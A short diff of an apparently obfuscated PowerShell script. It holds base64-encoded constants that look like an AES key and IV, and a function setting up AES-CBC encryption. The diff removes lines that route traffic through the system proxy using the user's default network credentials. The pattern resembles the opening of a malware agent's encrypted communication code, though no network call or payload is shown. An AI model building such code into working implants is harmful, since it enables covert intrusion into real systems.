@@ -2,9 +2,6 @@ $TSK_CHK = 4;
 $FUNNY = "T0NOR1RSQ0hSVFlLRVVUVEVSWVRFSkRCTElYVE9NUlU=";
 $FUNNY_DRIP = "WElBS0tQRVlCRENMTFpFUg=="
 
-[Net.WebRequest]::DefaultWebProxy = [Net.WebRequest]::GetSystemWebProxy()
-[Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
-
 function Create-NiceObject($FUNNY, $FUNNY_DRIP) {
     $UWDATWDF = New-Object "System.Security.Cryptography.AesManaged"
     $UWDATWDF.Mode = [System.Security.Cryptography.CipherMode]::CBC
